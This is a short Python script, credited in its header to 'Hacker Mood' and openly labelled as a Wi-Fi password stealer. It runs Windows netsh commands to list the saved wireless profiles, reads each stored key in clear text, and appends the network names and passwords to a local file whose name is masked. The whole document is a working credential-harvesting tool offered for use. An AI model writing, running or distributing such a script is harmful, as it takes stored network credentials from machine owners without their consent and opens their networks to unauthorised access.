'''
    Auteur : Hacker Mood
    github : https://github.com/HackerMood
    {local wiffi password steals}
'''
import subprocess
data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "Profil Tous les utilisateurs" in i]
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles',i , 'key=clear']).decode('utf-8',errors="backslashreplace").split('\n')
    t = [b.split(":")[1][1:-1] for b in results if "Contenu" in b]
    for h in t:
        f = open("********", 'a') #file name to write password Stolen
        f.write("{} --> {} \n".format(i, h))
        f.close
    